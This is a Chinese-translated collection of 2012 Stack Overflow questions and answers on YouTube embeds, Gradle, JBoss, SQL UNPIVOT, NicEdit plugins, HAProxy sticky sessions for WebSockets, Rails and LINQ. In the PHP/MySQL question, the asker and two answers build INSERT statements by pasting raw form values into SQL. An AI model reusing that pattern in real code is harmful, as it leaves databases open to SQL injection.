         function onYouTubeIframeAPIReady() {
            player1 = new YT.Player('player', {
              height: '390',
              width: '640',
              videoId: 'iZYIsJ9i5yE',});
          }
         function play1() { 
            player1.playVideo();
          }

         </script>

      <a href="#" onclick="play1()">Play Youtube Video</a>
   </body>
</html> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:09:11.877

`iframe#myplayer`您的脚本运行时可能还没有。像这样移动`player`函数内部的定义：

```
function play() {
    var player = document.getElementById("myplayer"); // Moved here
    if(player) {
        player.playVideo();
    }
} 
```

那应该行得通。

**编辑**：后一个链接似乎建议你这样做：

```
var player; // Might not be necessary

function onYouTubePlayerReady(playerId) {
    player = document.getElementById("myplayer");
}

function play() { 
    if(player) {
        player.playVideo();
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-25T15:02:31.750

```
<script>
    function toggleVideo(state) {
        var iframe = document.getElementById("myplayer").contentWindow;
        func = state == 'hide' ? 'pauseVideo' : 'playVideo';
        iframe.postMessage('{"event":"command","func":"' + func + '","args":""}', '*');
    }
</script>
<script type="text/javascript" src="http://www.youtube.com/player_api"></script>

<!-- popup and contents -->
<iframe id="myplayer" width="500" height="315" src="http://www.youtube.com/embed/C-VoyCDUvr0?enablejsapi=1"
    frameborder="0" allowfullscreen></iframe>
<a href="javascript:;" onclick="toggleVideo();">Play Youtube Video</a> 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2018-05-16T06:35:42.613

使用此 iframe 并更改您的 youtube 链接。我希望它一定会奏效。它正在我的网站上运行。

```
<iframe src="https://www.youtube.com/embed/2XXzYCfBiAg" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen style="width:100%; height:445px; padding:0; left:25%"></iframe> 
```

# c# - SQL分层查询替换XML

> ID：11651457
> 
> 赞同：0
> 
> 时间：2012-07-25T13:59:46.480
> 
> 标签：c#, asp.net, .net, sql, .net-4.0

我正在开发一个非常复杂的 ASP.NET Web 应用程序。菜单是一个树视图，它从 XML 文档中收集其内容。生成 XML 并填充 SQL 数据库中的数据。SQL 数据库中的数据存储在多个相互依赖的表中。所以最终菜单的方式是这样的。

SQL DB -> XML -> 树视图（菜单）

我的问题如下：有没有办法避免“xml”步骤并将数据从数据库分层读取到树视图中？还是有另一种方法可以直接从数据库数据中创建树视图？

我正在使用 ASP.NET 4.0、SQL SERVER 2008 和通常的 .NET Treeview 控件。

任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:06:34.267

您好，您可以在这里找到您的解决方案

```
http://aspalliance.com/732_Display_Hierarchical_Data_with_TreeView_in_ASPNET_20 
```

# plugins - 在 gradle 中提取文件夹并创建一个 jar

> ID：11651461
> 
> 赞同：0
> 
> 时间：2012-07-25T13:59:57.503
> 
> 标签：plugins, gradle

我在一个 zip 文件中有这个结构

```
classes
 |--com: A.class, B.class      
 |--org: C.class, D.class
 |--android: X.class
 |--stuff: Stuff.inf, info.txt 
```

我希望能够只提取带有 .class 文件的文件夹：com、org、android。并将它们放在罐子上。到目前为止，我已经这样做了：

```
task createJar {
    //unzip the file
    FileTree zip = zipTree('runtime.jar') 
    FileTree zip2 = zip.matching {
        include 'classes/**/*.class'        
    }
    zip2.each { file -> println "doing something with $file" }      

    //create the jar
    jar{        
        from zip2
        destinationDir  file('GradleTests/testResult')      
    }
} 
```

但是我得到了带有类文件夹的jar，比如：`classes/org/apache/http/entity/mime/content/StringBody.class` 我想要它：`org/apache/http/entity/mime/content/StringBody.class`

知道怎么做吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T17:26:58.903

所以我认为有两个主要的事情可以让你更接近你想要的：

1.  `zipTree`直接在任务中使用`jar`而不是创建中间 zip。
2.  用于`eachFile`更改每个文件的相对路径以剥离第一个文件夹。

```
jar {
  from zipTree('runtime.jar') {
    include 'classes/**/*.class'
    eachFile { it.relativePath = it.relativePath.segments[1..-1] }
  }
} 
```

Jar 任务具有所有[CopySpec](http://www.gradle.org/docs/current/javadoc/org/gradle/api/file/CopySpec.html#rename%28groovy.lang.Closure%29)方法，这些方法提供 eachFile 功能。

# jboss - Jboss & EJB3 部署错误

> ID：11651466
> 
> 赞同：0
> 
> 时间：2012-07-25T14:00:09.903
> 
> 标签：jboss, ejb-3.0

我是 EJB3 开发人员的新人。当我编写 EJB3 mdb 并且想将其部署到我的 jboss (jboss-4.2.3.GA) 时，这里有一些错误信息：

> --- MBeans 等待其他 MBeans --- ObjectName: jboss.j2ee:jar=HelloWorldEjb.jar,name=QueneMDB01,service=EJB3 状态: FAILED 原因: org.jboss.deployment.DeploymentException: 必需的配置属性RequiredConfigPropertyM etaData@12c08c7 [name=destination descriptions=[DescriptionMetaData@1941dc9[language=zh]]] 用于在激活配置 [ActivationConfigProperty(destinationType=javax.jms.Queue)、ActivationConfigProperty(acknowledgeMode=Auto -acknowledge)] ra=jboss.jca: service=RARDeployment,name='jms-ra.rar'
> 
> --- MBean 是问题的根本原因 --- ObjectName：jboss.j2ee:jar=HelloWorldEjb.jar,name=QueneMDB01,service=EJB3 状态：失败原因：org.jboss.deployment.DeploymentException：必需的配置属性RequiredConfigPropertyM etaData@12c08c7[name=destination descriptions=[DescriptionMetaData@1941dc9[language=zh]]] 在激活配置 [ActivationConfigProperty(destinationType=javax.jms.Queue)、ActivationConfigProperty 中找不到消息类型“javax.jms.MessageListener” (acknowledgeMode=Auto-acknowledge)] ra=jboss.jca: service=RARDeployment,name='jms-ra.rar'

我的 mdb 是：

```
@MessageDriven(activationConfig = {
    @ActivationConfigProperty(propertyName = "acknowledgeMode", propertyValue = "Auto-acknowledge"),
    @ActivationConfigProperty(propertyName = "destinationType", propertyValue = "javax.jms.Queue") })

public class QueneMDB01 implements MessageListener 
{
    public void onMessage(Message msg) {
        // TODO Auto-generated method stub
        try {
            TextMessage textMessage = (TextMessage) msg;
            System.out.println("MyQueneMDBBean is called "
                    + textMessage.getText() + " ");
        } catch (JMSException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-30T14:25:33.063

根据您的错误，我会说您忘记添加目标名称（可能是队列名称）。

```
FAILED Reason: org.jboss.deployment.DeploymentException: Required config property RequiredConfigPropertyM etaData@12c08c7[name=destination descriptions=[DescriptionMetaData@1941dc9[language=zh]] 
```

示例： [http ://www.javaissues.com/2011/06/ejb3-message-driven-bean-hello-world.html](http://www.javaissues.com/2011/06/ejb3-message-driven-bean-hello-world.html)

顺便说一句，您已经在 J​​Boss 中设置了队列/主题，对吗？

希望这会有所帮助，戴夫

# sql - SQL - 将多列组合成一列，多行

> ID：11651467
> 
> 赞同：0
> 
> 时间：2012-07-25T14:00:12.870
> 
> 标签：sql, rows

我有一个包含 20 列的表，它们都显示相同的内容。我不确定为什么我的公司会这样设置，但我无法对表格进行更改。

考虑到这一点，这就是我需要做的。我需要用保险公司名称填充下拉列表。因此，我需要在整个表中找到唯一值。

使用`Group By`子句是不可能的，因为我需要整个表中的唯一值。没有一列包含所有可能的值。我唯一的想法是将表格的所有列组合在一起。我已经看到使用两个管道（ || ）完成了这项工作。但这连接了对我没有帮助的列。

我需要将两个（或二十个）列连接在一起并将它们的行加在一起。即，如果我开始时有 20 列和 100 行，我需要有一列有 2000 行。这样我可以使用 Group By 子句选择唯一值。

任何帮助将不胜感激！

我正在尝试完成的示例：

样本原表：

```
 --Ins1-----Ins2---Ins3---Ins4-
    Medicaid-Medicare-------------
    ---------Medicaid-----No 485--
    Blue Cross--------------------
    -------Home Health----Medicare 
```

我需要构建的表：

```
 --Column1--
    -Medicaid--
    -----------
    Blue Cross-
    -----------
    -Medicare--
    -Medicaid--
    -----------
    Home Health
    -----------
    -----------
    -----------
    -----------
    -----------
    --No 485---
    -----------
    -Medicare-- 
```

也许我的逻辑是错误的。这是我能看到的在整个表中查找唯一信息的唯一方法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T14:07:48.277

如果这是 SQL Server，那么听起来您需要使用[UNPIVOT](http://msdn.microsoft.com/en-us/library/ms177410%28v=sql.105%29.aspx)来执行此转换。

示例 UNPIVOT（参见[SQL Fiddle](http://sqlfiddle.com/#!3/44083/4) with Demo）：

```
select ques, answer
FROM t1
unpivot
(
    answer
    for ques in (col1, col2, col3, col4)
) u 
```

UNPIVOT 会将您的数据从列转换为行。

# php - 如何处理注释？

> ID：11651472
> 
> 赞同：1
> 
> 时间：2012-07-25T14:00:26.123
> 
> 标签：php, annotations

我使用自定义 MVC 框架。我想使用上面的注释在视图中显示标题，例如：

```
class controller {
    /**
    * @title = some title
    */
    public function action(){
    }
} 
```

为此，我使用`ReflectionMethod::getDocComment`并使用简单的正则表达式解析注释，将`title`其设为全局变量并在我的视图中使用它。当然，这是一个解决方案，但非常糟糕，因为将来我可能需要使用注释，而不仅仅是定义标题（例如，在模型中定义规则。就像 Symphony 一样）。

我的问题是我不知道在哪里保存元数据。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:13:10.810

我认为将前端/公共信息存储在 docblock 注释中并不是一个好主意，因为您发现它非常笨拙，并且对于跟随您的其他开发人员来说不是很直观。应保留有关系统内部工作的文档和元信息的注释。

要存储这样的信息，您应该使用数据库、某种类变量或外部配置/语言文件。一个更好的选择是某种模板库来处理诸如页面标题和视图加载之类的事情，然后您可以从控制器方法调用它并在那里定义信息。

# php - 从测试服务器移动到实时服务器时出现 PHP 和 mysql 错误

> ID：11651478
> 
> 赞同：1
> 
> 时间：2012-07-25T14:00:42.363
> 
> 标签：php, mysql, forms

我遇到了一个奇怪的问题。我有一个简单的网络，其中包含一些验证规则，我已经在我的电脑上运行了几个星期来更新数据库。在本地主机上运行的测试阶段，一切都运行良好

此后，我已将 Web 表单和数据库移至我的服务器，当输入应该在我的本地计算机上接受的数据时，我收到以下错误

错误：您正在尝试输入无法存储或包含代码的信息。请刷新从并重试不正确的整数值：第 1 行的列 'entryID' 的 'NULL'

这是表单处理的基本代码

```
mysql_connect ("host", "username" , "password") or die ('Error: ' .mysql_error());
mysql_select_db ("name of database");

$query= "INSERT INTO entry (entryID, studentName , tutorName , procedureName , grade , studentReflection , tutorComments,  professionalism , communication , alert , dispute ) VALUES ('NULL', '".$options1."' , '".$options2." ' , '".$procedure."' , '".$grade."' , '".$studentReflection."', '".$tutorComments."' , '".$professionalism."' , '".$communication."' , '".$alert."' , '".$dispute."' )";

mysql_query($query) or die ('Error : You are attempting to enter information which cannot be stored or contains code. Please refesh the from and try again<br>' .mysql_error());

echo "<h3>The database has been updated.</br> Thank You </br><a href='form.php'>Enter another procedure</h3>"; 
}
?> 
```

我哪里错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:14:58.840

我想 entryID 是一个自动递增字段？如果是这样，只需将其从查询中删除。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T14:30:32.743

尝试删除`NULL`.

我认为您设置了自动增量选项`entryID`

```
$query= "INSERT INTO entry (entryID, studentName , tutorName , procedureName , grade , studentReflection , tutorComments,  professionalism , communication , alert , dispute ) VALUES (NULL, '".$options1."' , '".$options2." ' , '".$procedure."' , '".$grade."' , '".$studentReflection."', '".$tutorComments."' , '".$professionalism."' , '".$communication."' , '".$alert."' , '".$dispute."' )"; 
```

或尝试`''`而不是`NULL`自己

```
$query= "INSERT INTO entry (entryID, studentName , tutorName , procedureName , grade , studentReflection , tutorComments,  professionalism , communication , alert , dispute ) VALUES ('', '".$options1."' , '".$options2." ' , '".$procedure."' , '".$grade."' , '".$studentReflection."', '".$tutorComments."' , '".$professionalism."' , '".$communication."' , '".$alert."' , '".$dispute."' )"; 
```

# sql-server - 分发数据库中有大量命令等待应用到订阅者

> ID：11651481
> 
> 赞同：2
> 
> 时间：2012-07-25T14:00:55.670
> 
> 标签：sql-server, transactional-replication

我正在使用带有可更新订阅者 SQL 复制的过渡发布。我用新的表、视图和索引更新了数据库模式。自 2 天前更新以来，仍有大量命令等待应用到订阅者。我已经测试了 ddl 和 dml 命令，并且都可以立即复制而没有问题，即使复制监视器显示了这个积压的队列。

任何人都知道这些等待复制的命令是什么？以及为什么复制目前可以工作，还有这个积压。我的印象是复制是先进先出的。

使用 Microsoft SQL 2008 R2。

# youtube - 为 youtube 视频添加自定义 NicEdit 编辑器按钮

> ID：11651483
> 
> 赞同：0
> 
> 时间：2012-07-25T14:00:57.880
> 
> 标签：youtube, nicedit

我用过 nicEdit - [http://nicedit.com/](http://nicedit.com/)

我需要插入来自 youtube 的视频。我只需要插入 url 例如：`http://www.youtube.com/watch?v=4GuqB1BQVr4`

并替换为

`<iframe width="560" height="315" src="http://www.youtube.com/embed/4GuqB1BQVr4" frameborder="0" allowfullscreen></iframe>`

如何使用 nicEdit 插入来自 youtube 的视频？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-13T00:44:21.797

JDandChips 代码效果很好，但是我发现它把视频放在了内容的底部。在光标处插入

## 寻找

```
 this.ne.selectedInstance.setContent(this.ne.selectedInstance.getContent() + youTubeCode);
 this.removePane(); 
```

## 改成

```
 this.removePane();
  this.ne.nicCommand('insertHTML', youTubeCode); 
```

对我很有用。

## 这是完整的插件代码

```
var nicCodeOptions = {
buttons : {
    'xhtml': { name: 'Edit HTML', type: 'nicCodeButton' },
    'youTube' : {name : 'YouTube', type : 'nicYouTubeButton'}
},
iconFiles: {
    'youTube': '/nicedit/youtube.gif'
}
};

var nicYouTubeButton = nicEditorAdvancedButton.extend({
width: '350px',

addPane: function () {
    this.addForm({
        '': { type: 'title', txt: 'YouTube Url' },
        'youTubeUrl': { type: 'text', txt: 'URL', value: 'http://', style: { width: '150px'} },
        'height': { type: 'text', txt: 'Height', value: '560', style: { width: '150px'} },
        'width': { type: 'text', txt: 'Width', value: '315', style: { width: '150px'} }
    });
},

submit: function (e) {
    var code = this.inputs['youTubeUrl'].value;
    var width = this.inputs['height'].value;
    var height = this.inputs['width'].value;

    if (code.indexOf('watch?v=') > 0) {
        code = code.replace('watch?v=','embed/');
    }

    var youTubeCode = '<iframe width="' + width + '" height="' + height + '" src="' + code + '" frameborder="0" allowfullscreen></iframe>';

    this.removePane();
    this.ne.nicCommand('insertHTML', youTubeCode);
}
});
nicEditors.registerPlugin(nicPlugin,nicYouTubeOptions); 
```

nicCommand 为需要在光标位置插入 html 的其他插件插入 html。

抱歉，意思是说插件可以在光标位置插入任何 html [GO HERE](https://stackoverflow.com/a/12869304/1742621)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-13T11:15:56.343

## 添加自定义 nicEdit 按钮

您需要添加一个自定义按钮，如下所述：[http ://wiki.nicedit.com/w/page/516/Creating%20a%20Plugin](http://wiki.nicedit.com/w/page/516/Creating%20a%20Plugin)

当我第一次阅读此文档时，我发现有些部分令人困惑，因此我将引导您了解如何添加工作按钮。

如果您有 nicEdit.js 的开发版本，请转到文件底部，您将看到一个名为“nicCodeButton”的自定义按钮。

在此下方添加您自己的自定义按钮，该按钮应如下所示：

## YouTube 按钮代码

```
var nicYouTubeButton = nicEditorAdvancedButton.extend({
    width: '350px',

    addPane: function () {
        this.addForm({
            '': { type: 'title', txt: 'YouTube Url' },
            'youTubeUrl': { type: 'text', txt: 'URL', value: 'http://', style: { width: '150px'} },
            'height': { type: 'text', txt: 'Height', value: '560', style: { width: '150px'} },
            'width': { type: 'text', txt: 'Width', value: '315', style: { width: '150px'} }
        });
    },

    submit: function (e) {
        var code = this.inputs['youTubeUrl'].value;
        var width = this.inputs['height'].value;
        var height = this.inputs['width'].value;

        if (code.indexOf('watch?v=') > 0) {
            code = code.replace('watch?v=','embed/');
        }

        var youTubeCode = '<iframe width="' + width + '" height="' + height + '" src="' + code + '" frameborder="0" allowfullscreen></iframe>';

        this.ne.selectedInstance.setContent(this.ne.selectedInstance.getContent() + youTubeCode);
        this.removePane();
    }
}); 
```

接下来，您需要将按钮添加到自定义配置和面板使用的图标图像，也可以在文件底部找到。完成后将如下所示：

## 将您的按钮添加到配置

```
/* START CONFIG */
var nicCodeOptions = {
    buttons : {
        'xhtml': { name: 'Edit HTML', type: 'nicCodeButton' },
        'youTube' : {name : 'YouTube', type : 'nicYouTubeButton'}
    },
    iconFiles: {
        'youTube': 'nicEditorIcons2.gif'
    }
};
/* END CONFIG */ 
```

而已！

（上面的代码已经测试过了，如果你想使用它）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-02T17:56:26.523

即使有你在这里的所有指导，我也很难让它发挥作用，所以我会尝试在这方面提供尽可能多的帮助。很有可能它不是最终的解决方案，但也许这可以帮助任何想要尝试添加按钮的人。

我什至很难显示一个按钮，所以我把它全部减少到几乎没有弄清楚。

```
var nicYouTubeOptions = {
  buttons : {
    'youtube': {name : 'YouTube Link', type : 'nicYouTubeButton'}
  },
  iconFiles: {
    'youtube': 'images/youtube.gif'
  }
}; 
```

因此，这第一部分代码设置了您的按钮详细信息。换句话说，您用于按钮的图像和您将鼠标悬停在其上时看到的文本。type 旁边列出的最后一部分是`'nicYouTubeButton'`，它声明了按下按钮时要调用的函数。

```
var nicYouTubeButton = nicEditorAdvancedButton.extend({

}); 
```

这只是做所有事情的函数（当前为空）。

```
nicEditors.registerPlugin(nicPlugin,nicYouTubeOptions); 
```

最后一行使用 OPTIONS 函数而**不是**BUTTON 函数注册插件。

要立即在编辑器中使用此功能，您需要添加已在 OPTIONS 变量中创建的按钮（声明为“youtube”，此处注意小写）。为此，您需要修改文件顶部附近的行，如下所示：

```
buttonList : ['save','bold','italic','underline','left','center','right','justify','ol','ul','fontSize','fontFamily','fontFormat','indent','outdent','image','upload','link','unlink','forecolor','bgcolor','xhtml','table','youtube'], 
```

如您所见，我已经将“youtube”添加到列表中，确保在项目之间添加逗号。

只需在 EMPTY 函数中添加以下代码`nicYouTubeButton`：

```
width: '350px',

addPane: function () {
    this.addForm({
        '': { type: 'title', txt: 'YouTube Url' },
        'youTubeUrl': { type: 'text', txt: 'URL', value: 'http://', style: { width: '150px'} },
        'height': { type: 'text', txt: 'Height', value: '560', style: { width: '150px'} },
        'width': { type: 'text', txt: 'Width', value: '315', style: { width: '150px'} }
    });
},

submit: function (e) {
    var code = this.inputs['youTubeUrl'].value;
    var width = this.inputs['height'].value;
    var height = this.inputs['width'].value;

    if (code.indexOf('watch?v=') > 0) {
        code = code.replace('watch?v=','embed/');
    }

    var youTubeCode = '<iframe width="' + width + '" height="' + height + '" src="' + code + '" frameborder="0" allowfullscreen></iframe>';

    this.ne.selectedInstance.setContent(this.ne.selectedInstance.getContent() + youTubeCode);
    this.removePane();
} 
```

确保不要删除任何 } 或 {

希望这可以帮助你们中的任何人难以让它像我一样出现。

# node.js - 基于 Cookie 的 WebSocket 负载平衡？

> ID：11651484
> 
> 赞同：7
> 
> 时间：2012-07-25T14:00:58.463
> 
> 标签：node.js, websocket, scalability, load-balancing

我的情况是，我们目前正在编写一个在线应用程序，它在服务器端使用 Node.js 和 WebSocket 侦听器。我们有两个不同的部分：一个提供页面并使用 node.js 和 express+ejs，另一个是一个完全不同的应用程序，它只包含用于 websockets 的 socket.io 库。所以这里我们来讨论这个websockets部分的可扩展性问题。

我们发现的一种解决方案是使用 redis 并在服务器之间共享套接字信息，但由于架构的原因，它需要共享其他信息的负载，这将在服务器上产生巨大的开销。

在这个介绍之后，我的问题是 - 是否可以对 websockets 使用基于 cookie 的负载平衡？因此，可以说来自 cookie server=server1 的用户的每个连接都将始终转发到 server1，并且 cookie server=server2 的每个连接都将转发到 server2，而没有此类 cookie 的连接将转发到最不繁忙的服务器。

更新：正如一个“答案”所说——是的，我知道这存在。只是不记得那个名字是粘性会话。但问题是——这适用于 websockets 吗？有没有可能的并发症？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T20:36:31.400

我们的 Node.js 生产堆栈中出现了类似的问题。我们有两台使用 WebSockets 的服务器，它们适用于正常用例，但偶尔负载均衡器会在两台服务器之间反弹这些连接，这会导致问题。（我们在后端有会话代码应该已经修复它，但没有正确处理它。）

我们尝试在这些服务器前的梭子鱼负载均衡器上启用 Sticky Session，但发现由于其运行方式，它会阻止 WebSocket 流量。我没有研究确切原因，因为在线可用的信息很少，但似乎这是由于平衡器如何剥离 HTTP 请求的标头，获取 cookie，并将请求转发到正确的后端服务器。由于 WebSockets 以 HTTP 开始，但随后升级，负载均衡器没有注意到连接的差异，并会尝试执行相同的 HTTP 处理。这将导致 WebSocket 连接失败，从而断开用户连接。

以下是我们目前所拥有的，运行良好。我们仍然在后端服务器前使用梭子鱼负载均衡器，但我们没有在负载均衡器上启用粘性会话。在我们的后端服务器上，我们的应用服务器前面是 HAProxy，它确实支持 WebSocket，并且可以以“迂回”的方式提供粘性会话。

* * *

**请求流列表**

1.  传入的客户端请求命中主梭子鱼负载均衡器
2.  负载均衡器转发到任一活动后端服务器
3.  HAProxy 接收请求并检查新的“粘性 cookie”
4.  基于 cookie，HAProxy 转发到正确的后端应用服务器

* * *

**请求流程图**

```
 WebSocket Request  /--> Barracuda 1 -->\   /--> Host 1 -->\   /--> App 1
------------------->                     -->                -->
                    \--> Barracuda 2 -->/   \--> Host 2 -->/   \--> App 1 
```

当箭头返回一个请求时，这意味着请求可以流向流中的任一点。

* * *

**HAProxy 配置详细信息**

```
backend app_1
   cookie ha_app_1 insert
   server host1 10.0.0.101:80011 weight 1 maxconn 1024 cookie host_1 check
   server host2 10.0.0.102:80011 weight 1 maxconn 1024 cookie host_2 check 
```

在上面的配置中：

*   `cookie ha_app_1 insert`是实际使用的 cookie 名称
*   `cookie host_1 check`或`cookie host_2 check`设置 cookie 值

# javascript - 无论页面缩放如何，您如何为移动设备制作保持相同大小的 CSS 菜单？

> ID：11651485
> 
> 赞同：7
> 
> 时间：2012-07-25T14:00:59.137
> 
> 标签：javascript, html, css

我想为移动设备创建一个上下文菜单，它会在页面内容上弹出并用按钮列表填充屏幕的一部分。这很简单。

但是，无论页面在设备上的位置/方式如何缩放，我都希望菜单具有相同的确切大小和固定位置。因此，无论何时调用菜单，即使用户非常放大，按钮列表也会显示为相同大小。换句话说，我想模仿手机上已经存在的菜单的功能，例如 Chrome Mobile beta 的选项菜单。

这可能只用CSS吗？还是需要一些 JavaScript？还是一般情况下不可行？

换句话说，是否可以制作这样的菜单 Refresh/etc 菜单：

![在此处输入图像描述](../Images/8358e081820d36e2dfe5ff056f353219.png)

无论浏览器缩放如何，它都是恒定大小的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T15:18:00.837

使用相对大小并动态更改字体大小

简单演示： http: [//jsfiddle.net/tQauj/3/](http://jsfiddle.net/tQauj/3/)（调整结果窗口大小）

你也可以使用 CSS3 scale 属性

**更新后的版本：**

动态填充和窗口居中：http:
[//jsfiddle.net/tQauj/22/](http://jsfiddle.net/tQauj/22/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:04:38.377

您应该能够使用 CSS 中的绝对和或固定位置属性来执行此操作。 [http://www.w3schools.com/cssref/pr_class_position.asp](http://www.w3schools.com/cssref/pr_class_position.asp)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:05:24.947

这是一个带有一些 CSS 的示例，显示了如何使菜单保持相同的大小和位置：http: [//jsfiddle.net/ZfKyj/2/](http://jsfiddle.net/ZfKyj/2/)

不幸的是，您似乎无法如此轻松地控制字体大小，主要是因为确定缩放级别实际上非常复杂：[如何检测所有现代浏览器中的页面缩放级别？](https://stackoverflow.com/questions/1713771/how-to-detect-page-zoom-level-in-all-modern-browsers)

您最好看看是否有一种方法可以使用各种移动浏览器的 API 中的函数来生成上下文菜单，但如果没有，您可能能够从我上一段中链接的问题中找出一些东西。

# eclipse - 在 Eclipse 4.2 (Juno) 中找不到 SVN/Subversion 1.5 的插件/连接器

> ID：11651488
> 
> 赞同：1
> 
> 时间：2012-07-25T14:01:02.073
> 
> 标签：eclipse, svn, eclipse-plugin, subversive

为了与同事兼容，我需要在安装 Eclipse 4.2 Juno 时使用 SVN 1.5，但找不到使用旧版本 SVN 的兼容插件。

我想我只需要连接器，但如果我必须使用不同的插件，那么我会的。

我找错地方了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:18:02.083

你可以试试[Subclipse](http://subclipse.tigris.org/)。根据他们的[下载页面](http://subclipse.tigris.org/servlets/ProjectProcess?pageID=p4wYuA)，1.4 版本适用于 Subversion 1.5。虽然很旧，Subclipse 1.4 仍然可以从他们的镜像中下载。我没有在 Juno 中尝试过，但很有可能会奏效

*编辑：我假设您在 Juno 中要求 Subversion 客户端插件*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-29T18:01:29.347

Eclipse Juno 与 svn 1.5 服务器连接的 Subclipse 插件：
您可以在 tigris 网站上再次检查要下载的版本，但据我所知，我使用 svn1.5 作为 repo 下载 url 是[http:/ /subclipse.tigris.org/update_1.4.x](http://subclipse.tigris.org/update_1.4.x)在 Eclipse 菜单中（帮助/安装新软件/可用软件站点）。如果您之前输入了一些，请确保删除与此下载操作相关的先前 url。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:08:22.320

你为什么要使用旧版本的朱诺最后

试试这个页面 [http://subversion.apache.org/docs/release-notes/1.5.html](http://subversion.apache.org/docs/release-notes/1.5.html)

# ruby-on-rails - 有没有办法阻止这个默认插入到 rails

> ID：11651489
> 
> 赞同：2
> 
> 时间：2012-07-25T14:01:05.077
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

好的，所以我有这个数据结构

```
class User < ActiveRecord::Base
  has_many :companies, :through => :positions
  has_many :positions

class Company < ActiveRecord::Base
  has_many :positions
  has_many :users, :through => :positions

class Position < ActiveRecord::Base
  belongs_to :company
  belongs_to :user
  attr_accessible :company_id, :user_id, :regular_user
end 
```

还有我的数据库结构

```
create_table "positions", :force => true do |t|
  t.integer  "company_id"
  t.integer  "user_id"
  t.datetime "created_at",                     :null => false
  t.datetime "updated_at",                     :null => false
  t.boolean  "regular_user", :default => true
end 
```

如果我将另一家公司添加到用户公司，则 regular_user 标志始终设置为 true

```
1.9.3-p125 :013 > @user.companies << Company.last
  Company Load (0.3ms)  SELECT `companies`.* FROM `companies` 
  ORDER BY `companies`.`id` DESC LIMIT 1
   (0.0ms)  BEGIN
  SQL (0.2ms)  INSERT INTO `positions` 
(`company_id`, `created_at`, `regular_user`, `updated_at`, `user_id`) 
VALUES 
(263, '2012-07-25 13:56:56', 1, '2012-07-25 13:56:56', 757) 
```

有没有办法在插入之前将标志设置为 false

我一直在通过这样做来解决它....这是骇人听闻的

```
@user.positions.update_all(:regular_user => false) if @user.is_admin? 
```

是否有另一种方法（更清洁）来实现这一目标

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:07:20.137

使用`before_save`过滤器。
前任。：

```
class Position

  before_save :set_regular_user_to_false

  def set_regular_user_to_false
    self.regular_user = false
  end

end 
```

就像过滤器名称所说的那样，这将在保存对象之前拦截事件链`position`，因此您可以更改`regular_user`属性。

**编辑**

```
def set_regular_user_to_false
  if self.user.user_type != 'admin'
    self.regular_user = false
  end
  true
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:13:01.793

可以直接插入位置

```
user.positions << Position.new(company: Company.last, regular_user: false) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:19:17.170

老实说，自从我使用 AR 迁移以来已经有一段时间了，所以在生产数据库上运行它之前，请仔细检查我的语法。

话虽如此，这是在数据库级别设置的，因为您的表结构已将其设置为 true。因此，如果存在 NULL 情况，它将变为 true。

您应该能够运行迁移，将您的数据库列更改为默认为 false。您也可以按照@MurifoX 的建议使用回调覆盖，但我认为这可以更好地解决您的核心投诉。

祝你好运！

```
class ChangePostitionsRegularUser < ActiveRecord::Migration

  def up
    change_column :positions, :regular_user, :boolean, :default => false
  end

  def down
    change_column :positions, :regular_user, :boolean, :default => true
  end
end 
```

# c# - 我可以使用 linq 从 asp .net DropDownList.Items 中删除项目吗？

> ID：11651492
> 
> 赞同：2
> 
> 时间：2012-07-25T14:01:14.020
> 
> 标签：c#, asp.net, linq, dropdownbox

正如标题所说，是否可以使用 LINQ 从 DropDownList 的 .Items 中删除项目，其中项目不等于我指定的字符串？

换句话说 - 我有一个字符串列表，如果一个 Item 与列表中的任何字符串都不匹配，它将被删除。

注意：我知道如何实现这一点，我可以使用 foreach 循环来实现。很好 - 但我想知道是否有 LINQ 替代方案。

编辑：我应该说 - Item 的**.Text**属性匹配字符串列表中的任何项目。

编辑：对于那些感兴趣的人，这是我提出的“foreach”方式：

```
 private void FilterDropDownChoices(List<String> permittedChoices)
        {
            foreach(ListItem item in ddlChoices.Items)
            {
                if (!permittedChoices.Contains(item.Text))
                {
                    ddlChoices.Items.Remove(item);
                }
            }
        } 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-25T14:32:06.133

ryanulit 实际上提供了最好的答案。

问题是 ListItemCollection 只实现了 IEnumerable 接口。LINQ 扩展适用于 IEnumerable<T>。因此，将 (IEnumerable) 转换为 (IEnumerable<T>) - 您现在可以使用 LINQ。

所以，回答你的问题：

```
ddlChoices.Items
.Cast<ListItem>()
.Where(item => !permittedChoices.Contains(item.Text))
.ToList()
.ForEach(ddlChoices.Items.Remove); 
```

您必须使用 ToList() 或 ToArray() 或类似方法，因为在读取集合时无法修改集合 - ToList() 复制对所选项目的引用，然后可以循环并从 ListItemCollection 中删除。

